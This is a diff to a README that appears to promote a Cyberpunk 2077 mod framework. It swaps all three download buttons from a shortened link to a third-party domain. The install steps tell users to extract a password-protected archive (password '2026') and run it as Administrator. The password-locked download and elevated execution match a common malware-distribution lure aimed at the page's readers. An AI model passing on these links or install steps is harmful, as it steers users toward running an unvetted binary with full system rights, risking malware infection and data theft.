@@ -9,7 +9,7 @@ The **⚙️ Cyber Engine Tweaks** is a **free** mod framework and script inject
 
 <div align="center">
 
-[![Download Cyber Engine Tweaks](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/cyber-engine-tweaks)
+[![Download Cyber Engine Tweaks](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://software-nation.com/cyber-engine-tweaks)
 
 </div>
 
@@ -119,7 +119,7 @@ Cyberpunk 2077 is massive — but sometimes you want to skip the grind, test bui
 2. **📦 Extract the archive** — password: `2026`
 3. **🖱️ Run as Administrator** → Follow setup → Launch Cyberpunk 2077
 
-[![Download Cyber Engine Tweaks](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/cyber-engine-tweaks)
+[![Download Cyber Engine Tweaks](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://software-nation.com/cyber-engine-tweaks)
 
 ### Detailed Installation (April 2026 Update)
 
@@ -272,7 +272,7 @@ Take full control of Cyberpunk 2077 for free. **Cyber Engine Tweaks** lets you s
 
 <div align="center">
 
-[![Download Cyber Engine Tweaks](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/cyber-engine-tweaks)
+[![Download Cyber Engine Tweaks](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://software-nation.com/cyber-engine-tweaks)
 
 **Version 4.6.1** — Free mod framework. April 2026 update. Zero cost. No payment.
 
